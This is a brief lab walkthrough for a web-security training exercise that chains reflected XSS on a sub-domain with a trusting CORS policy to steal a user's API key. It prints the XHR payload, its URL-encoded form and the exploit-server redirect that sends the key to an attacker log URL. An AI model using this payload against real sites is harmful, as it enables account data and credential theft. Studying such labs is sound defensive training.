# Lab: CORS vulnerability with trusted insecure protocols
## Description
1. Used a hint :-)
2. Found XSS in `productId` on a sub-domain at `http://stock.victim.web-security-academy.net/?productId=4&storeId=1`
3. Created XSS script to trigger a CORS request to `https://victim.web-security-academy.net/accountDetails`
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
var obj = JSON.parse(this.responseText);
location='https://hacker.web-security-academy.net/log?key='+obj.apikey;
};
```
4. URL-encoded key characters and converted into a single line
```
%3cscript%3evar+req+%3d+new+XMLHttpRequest()%3breq.onload+%3d+reqListener%3breq.open('get','https%3a//ac801f661edac6c4800502f400fd00b1.web-security-academy.net/accountDetails',true)%3breq.withCredentials+%3d+true%3breq.send()%3bfunction+reqListener()+%7bvar+obj+%3d+JSON.parse(this.responseText)%3blocation%3d'https%3a//acae1f671e9cc6d9801c02d301270099.web-security-academy.net/log%3fkey%3d'%2bobj.apikey%3b}%3b%3c/script%3e
```
5. Prepared exploit server to redirect user to malicious XSS URL to trigger the CORS request and steal the API key.

## Solution
```js
<script>
document.location="http://stock.ac801f661edac6c4800502f400fd00b1.web-security-academy.net/?productId=4%3cscript%3evar+req+%3d+new+XMLHttpRequest()%3breq.onload+%3d+reqListener%3breq.open('get','https%3a//ac801f661edac6c4800502f400fd00b1.web-security-academy.net/accountDetails',true)%3breq.withCredentials+%3d+true%3breq.send()%3bfunction+reqListener()+%7bvar+obj+%3d+JSON.parse(this.responseText)%3blocation%3d'https%3a//acae1f671e9cc6d9801c02d301270099.web-security-academy.net/log%3fkey%3d'%2bobj.apikey%3b}%3b%3c/script%3e&storeId=1";
</script>
```